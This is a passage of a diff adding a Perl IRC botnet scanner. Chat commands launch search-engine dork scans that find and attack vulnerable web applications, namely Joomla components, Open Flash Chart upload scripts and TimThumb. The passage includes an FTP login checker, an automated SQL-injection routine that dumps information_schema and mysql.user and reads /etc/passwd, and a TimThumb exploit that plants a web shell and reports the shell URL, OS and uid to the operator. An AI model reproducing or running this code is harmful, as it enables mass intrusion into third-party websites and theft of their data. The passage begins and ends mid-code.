+						&msg("$path","$mmformlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,23);
+						}
+					}
+				}
+                if ($msg =~ /^$phpvmscmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/core/lib/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan PhpVms di 4$path ");
+						&msg("$path","$phpvmslogo9Dork $dork ");
+						&msg("$path","$phpvmslogo9Search Engine Now Loading ... ");
+						&msg("$path","$phpvmslogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,21);
+						}
+					}
+				}
+
+                if ($msg =~ /^$maiancmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Maianmedia di 4$path ");
+						&msg("$path","$maianlogo9Dork $dork ");
+						&msg("$path","$maianlogo9Search Engine Now Loading ... ");
+						&msg("$path","$maianlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,16);
+						}
+					}
+				}
+                if ($msg =~ /^$civicrmcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Civicrm di 4$path ");
+						&msg("$path","$civicrmlogo9Dork $dork ");
+						&msg("$path","$civicrmlogo9Search Engine Now Loading ... ");
+						&msg("$path","$civicrmlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,17);
+						}
+					}
+				}
+                if ($msg =~ /^$lettercmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan letter di 4$path ");
+						&msg("$path","$letterlogo9Dork $dork ");
+						&msg("$path","$letterlogo9Search Engine Now Loading ... ");
+						&msg("$path","$letterlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,18);
+						}
+					}
+				}
+                if ($msg =~ /^$livecartcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/library/openFlashChart/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Live Cart di 4$path ");
+						&msg("$path","$livecartlogo9Dork $dork ");
+						&msg("$path","$livecartlogo9Search Engine Now Loading ... ");
+						&msg("$path","$livecartlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,24);
+						}
+					}
+				}
+                if ($msg =~ /^$maian15cmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Maian15 di 4$path ");
+						&msg("$path","$maian15logo9Dork $dork ");
+						&msg("$path","$maian15logo9Search Engine Now Loading ... ");
+						&msg("$path","$maian15logo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,23);
+						}
+					}
+				}
+
+                if ($msg =~ /^$acycmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Acymailing di 4$path ");
+						&msg("$path","$acylogo9Dork $dork ");
+						&msg("$path","$acylogo9Search Engine Now Loading ... ");
+						&msg("$path","$acylogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,15);
+						}
+					}
+				}
+
+                if ($msg =~ /^$jinccmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan JINC di 4$path ");
+						&msg("$path","$jinclogo9Dork $dork ");
+						&msg("$path","$zinclogo9Search Engine Now Loading ... ");
+						&msg("$path","$jincologo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,14);
+						}
+					}
+				}
+
+
+
+
+
+
+
+				if ($msg =~ /^$ftpcmd\s+(.+?)\s+(.*)\s+(.*)/) {
+				my $url = $_[0];
+				my $host = $_[1];
+				my $user = $_[2];
+				my $pass = $_[3];
+					if (my $pid = fork) {
+						waitpid($pid, 0);
+					} else {
+						if (fork) { exit; } else {
+				my ($host,$user,$pass) = ($1,$2,$3);
+					&msg("$path","9,1[4!9]FTP 4<9=4>15 Checking $host | $user:$pass");
+					my $success = 1;
+					use Net::FTP;
+					my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);
+					$success = 0 if $ftp->login($user,$pass);
+					$ftp->quit;
+					if ($success == 0) {
+						&notice("$nick","15,1 [9FTP15] [ 9http://".$host." 15] [".$user.":".$pass."15] 9Success ");
+						} else {
+						&notice("$nick","15,1 [9FTP15] [ 9http://".$host." 15] [".$user.":".$pass."15] 4Denied ");
+
+					}
+				}
+			}
+		}
+	}
+}
+        for(my $c=0; $c<= $#lines; $c++) {
+            $line = $lines[$c];
+            $line = $line_temp.$line if ($line_temp);
+            $line_temp = '';
+            $line =~ s/\r$//;
+            unless ($c == $#lines) {
+
+                parse("$line");
+            } else {
+                if ($#lines == 0) {
+                    parse("$line");
+                } elsif ($lines[$c] =~ /\r$/) {
+                    parse("$line");
+                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
+                    parse("$line");
+                } else {
+                    $line_temp = $line;
+                }
+            }
+        }
+    }
+}
+
+##################################################################################
+
+sub type() {
+my ($chan,$bug,$simpan,$dork,$engine,$type) = @_;
+	if ($type == 1){$type=&thumb_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 2){$type=&whmcs_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 3){$type=&lfi_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 4){$type=&zero_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 5){$type=&rfi_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 6){$type=&xml_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 7){$type=&e107_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 8){$type=&ih_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 9){$type=&osco_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 10){$type=&zen_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 11){$type=&rfg_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 12){$type=&jnews_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 13){$type=&jce_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 14){$type=&jinc_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 15){$type=&acy_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 16){$type=&maian_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 17){$type=&civicrm_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 18){$type=&letter_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 19){$type=&clipbucket_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 20){$type=&redmistyc_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 21){$type=&phpvms_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 22){$type=&reflex_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 23){$type=&maian15_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 24){$type=&livecart_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 25){$type=&switchblade_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 26){$type=&coldfusion_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 27){$type=&joomleague_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 28){$type=&photostore_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 29){$type=&sql_exploit($chan,$bug,$simpan,$dork,$engine);}
+	elsif ($type == 30){$type=&pointofsale_exploit($chan,$bug,$simpan,$dork,$engine);}
+	
+}
+
+##################################################################################
+
+sub se_start() {
+my ($chan,$bug,$simpan,$dork,$engine,$type) = @_;
+	if ($gps == 1) {
+	if ($engine =~ /jackae/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKAE",$type); } exit; } }
+	if ($engine =~ /jackar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKAR",$type); } exit; } }
+	if ($engine =~ /jackat/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKAT",$type); } exit; } }
+	if ($engine =~ /jackau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKAU",$type); } exit; } }
+	if ($engine =~ /jackbr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKBR",$type); } exit; } }
+	if ($engine =~ /jackca/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKCA",$type); } exit; } }
+	if ($engine =~ /jackcl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKCL",$type); } exit; } }
+	if ($engine =~ /jackcn/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKCN",$type); } exit; } }
+	if ($engine =~ /jackcom/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKCoM",$type); } exit; } }
+	if ($engine =~ /jackcz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKCZ",$type); } exit; } }
+	if ($engine =~ /jackde/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKDE",$type); } exit; } }
+	if ($engine =~ /jackdk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKDK",$type); } exit; } }
+	if ($engine =~ /jackes/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKES",$type); } exit; } }
+	if ($engine =~ /jackeu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKEU",$type); } exit; } }
+	if ($engine =~ /jackfr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKFR",$type); } exit; } }
+	if ($engine =~ /jackhu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKHU",$type); } exit; } }
+	if ($engine =~ /jackid/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKID",$type); } exit; } }
+	if ($engine =~ /jackil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKIL",$type); } exit; } }
+	if ($engine =~ /jackin/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKIN",$type); } exit; } }
+	if ($engine =~ /jackinfo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKInfO",$type); } exit; } }
+	if ($engine =~ /jackir/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKIR",$type); } exit; } }
+	if ($engine =~ /jackit/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKIT",$type); } exit; } }
+	if ($engine =~ /jackjp/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKJP",$type); } exit; } }
+	if ($engine =~ /jackkr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKKR",$type); } exit; } }
+	if ($engine =~ /jackmx/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKMX",$type); } exit; } }
+	if ($engine =~ /jackmy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKMY",$type); } exit; } }
+	if ($engine =~ /jacknet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKNeT",$type); } exit; } }
+	if ($engine =~ /jacknl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKNL",$type); } exit; } }
+	if ($engine =~ /jackorg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKOrG",$type); } exit; } }
+	if ($engine =~ /jackph/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKPH",$type); } exit; } }
+	if ($engine =~ /jackpl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKPL",$type); } exit; } }
+	if ($engine =~ /jackro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKRO",$type); } exit; } }
+	if ($engine =~ /jackru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKRU",$type); } exit; } }
+	if ($engine =~ /jackth/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKTH",$type); } exit; } }
+	if ($engine =~ /jackua/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKUA",$type); } exit; } }
+	if ($engine =~ /jackuk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKUK",$type); } exit; } }
+	if ($engine =~ /jackus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKUS",$type); } exit; } }
+	if ($engine =~ /jacksi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKSI",$type); } exit; } }
+	if ($engine =~ /jackbe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKBE",$type); } exit; } }
+	if ($engine =~ /jackbiz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"JacKBIZ",$type); } exit; } }
+	}
+	if ($engine =~ /google/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"GooGLe",$type); } exit; } }
+
+
+
+	if ($gps2 ==1) {
+	if ($engine =~ /bing/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"Bing",$type); } exit; } }
+	if ($engine =~ /biglobe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"BigLobe",$type); } exit; } }
+	if ($engine =~ /walla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"WaLLa",$type); } exit; } }
+	if ($engine =~ /yahoo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"YaHoo",$type); } exit; } }
+	if ($engine =~ /ask/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"AsK",$type); } exit; } }
+	if ($engine =~ /uol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"UoL",$type); } exit; } }
+	if ($engine =~ /onet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"OnEt",$type); } exit; } }
+	if ($engine =~ /clusty/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"CLusTy",$type); } exit; } }
+	if ($engine =~ /sapo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"SaPo",$type); } exit; } }
+	if ($engine =~ /aol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"AoL",$type); } exit; } }
+	if ($engine =~ /lycos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"LyCos",$type); } exit; } }
+	if ($engine =~ /hotbot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"HotBot",$type); } exit; } }
+	if ($engine =~ /seznam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$simpan,$dork,"SeZNam",$type); } exit; } }
+	    }
+}
+
+
+###### EXPLOITING #######
+
+sub sql_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$sqllogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$sqllogo15$engine 9Finished 15for 9$dork "); }
+		
+			my $test = "http://".$site.$bug."'";
+			my $vuln = "http://".$site."12".$bug;
+			my $sqlsite = "http://".$site.$bug;
+			my $html = &get_content($test);
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {			
+		
+			if ($html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {
+			    &sqlbrute($sqlsite,$chan,$engine);}
+			
+			elsif ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
+				&msg("$chan","$sqllogo(4@3$engine15)15(7@12MsSQL15)4 ".$vuln);
+				&sqlbrute($sqlsite,$chan,$engine);}
+			
+			elsif ($html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i || $html =~ m/Microsoft OLE DB Provider for Oracle/i ) {
+				&msg("$chan","$sqllogo(4@3$engine15)15(9@12MsAccess15)4 ".$vuln);
+				&sqlbrute($sqlsite,$chan,$engine);}
+			
+			elsif ($html =~ m/mysql_/i || $html =~ m/Division by zero in/i || $html =~ m/mysql_fetch_array/i ) {
+				&sqlbrute($sqlsite,$chan,$engine);}		
+
+		
+		
+			} exit; }
+		}
+	}
+}
+
+
+
+sub sqlbrute() {
+			my $situs=$_[0];
+			my $chan  =$_[1];
+			my $engine=$_[2];
+			my $columns=30;
+            my $cfin.="--";
+            my $cmn.= "+";
+	for ($column = 0 ; $column < $columns ; $column ++)
+	{
+	$union.=','.$column;
+	$inyection.=','."0x6c6f67696e70776e7a";
+	if ($column == 0)
+	  {
+		  $inyection = '';
+		  $union = '';
+	  }
+	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
+	$response=get($sql);
+	if($response =~ /loginpwnz/)
+		{
+		 $column ++;
+		 $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
+		 &msg("$chan","$sqllogo(4@3$engine15)15(4@12SQL15)9 $sql ");
+		 $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
+		 $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
+		 if($response =~ /loginpwnz/)
+		 	{
+		 	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
+			&msg("$chan","$sqllogo(4@3$engine15)15(4@12SQL15)(4@14INFO_SCHEMA14)9 $sql ");
+		 	}
+		 $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
+		 $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
+		 if($response =~ /loginpwnz/)
+		 	{
+		 	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
+			&msg("$chan","$sqllogo(4@3$engine15)15(4@12SQL15)(4@14USER14)9 $sql ");
+		 	}
+		 else
+		 	{
+		 	}
+	while ($loadcont < $column-1)
+	   {
+		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
+		$loadcont++;
+	   }
+	   $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
+	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
+		 if($response =~ /root:x:/)
+		 	{
+			&msg("$chan","0,1$sqllogo(4@3$engine15)15(4@12SQL15)(4@14Load File14)9 $sql ");
+			}
+		 else
+		 	{
+		 	}
+			  foreach $tabla(@tabele)
+				{
+				  chomp($tabla);
+				  $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
+				 $response=get($sql)or die("[-] Impossible to get tables\n");
+				  if($response =~ /loginpwnz/)
+					{
+					$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
+					&msg("$chan","0,1$sqllogo(4@3$engine15)15(13@12SQL15)(4@14Tabel14)9 $sql ");
+					}
+				}
+		}
+	}
+}
+
+sub thumb_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+    my @totexploit = &search_engine($chan,$bug,$dork,$engine,$thumblogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+	    foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$thumblogo15$engine 9Finished 15for 9$dork "); }
+		    my $vuln = "http://".$site.$bug;
+			my $cek  = &get_content($vuln);sleep(1);
+			my $nama = $simpan;
+			
+			if ($cek =~ /no image specified/i) {
+			&msg("$chan","$thumblogo(4@3$engine15)Exploiting 4http://$site");sleep(1);
+			    my $hajar = "http://".$site.$bug."?src=".$thumbshell."";
+				my $cek  = &get_content($hajar);sleep(1);
+				
+				(my $kliverz = $bug)=~ s{/[^/]+\z}{};
+			     my $vuln2 = "http://".$site.$kliverz.$folder1;
+			     my $vuln3 = "http://".$site.$kliverz.$folder2;
+			     my $vuln4 = "http://".$site.$kliverz.$folder3;
+			     my $vuln5 = "http://".$site.$kliverz.$folder4;
+			     my $vuln6 = "http://".$site.$folder5;		
+					
+			     my $check1 = &get_content($vuln2);sleep(1);
+			     my $check2 = &get_content($vuln3);sleep(1);
+			     my $check3 = &get_content($vuln4);sleep(1);
+			     my $check4 = &get_content($vuln5);sleep(1);
+			     my $check5 = &get_content($vuln6);sleep(1);
+					
+				if ($check1 =~ /GIF89a/) {
+				  my $safe = ""; my $os = ""; my $uid = "";
+                
+				  if ($check1 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				  if ($check1 =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				  if ($check1 =~ /uid=(.*?)gid=/){$uid=$1;}
+				
+				  &msg("$chan","$thumblogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				  &msg("$nama","$thumblogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $vuln215 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+                }
+				
+				if ($check2 =~ /GIF89a/) {
+				  my $safe = ""; my $os = ""; my $uid = "";
+                
+				  if ($check2 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				  if ($check2 =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				  if ($check2 =~ /uid=(.*?)gid=/){$uid=$1;}
+				
+				  &msg("$chan","$thumblogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				  &msg("$nama","$thumblogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $vuln315 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+                }
+				
+	            if ($check3 =~ /GIF89a/) {
+				  my $safe = ""; my $os = ""; my $uid = "";
+                
+				  if ($check3 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				  if ($check3 =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				  if ($check3 =~ /uid=(.*?)gid=/){$uid=$1;}
+				
+				  &msg("$chan","$thumblogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				  &msg("$nama","$thumblogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $vuln415 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+                }
+				
+				if ($check4 =~ /GIF89a/) {
+				  my $safe = ""; my $os = ""; my $uid = "";
+                
+				  if ($check4 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				  if ($check4 =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				  if ($check4 =~ /uid=(.*?)gid=/){$uid=$1;}
+				
+				  &msg("$chan","$thumblogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				  &msg("$nama","$thumblogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $vuln515 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+                }				
+				
+				if ($check5 =~ /GIF89a/) {
+				  my $safe = ""; my $os = ""; my $uid = "";
+                
+				  if ($check5 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				  if ($check5 =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				  if ($check5 =~ /uid=(.*?)gid=/){$uid=$1;}
+				
+				  &msg("$chan","$thumblogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				  &msg("$nama","$thumblogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $vuln615 (SafeMode=$safe) (OS=$os) uid=$uid ");
+ 
+			    					 
+				}	
+			}
+        }
+    }
+}
+
+sub jce_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jcelogo);
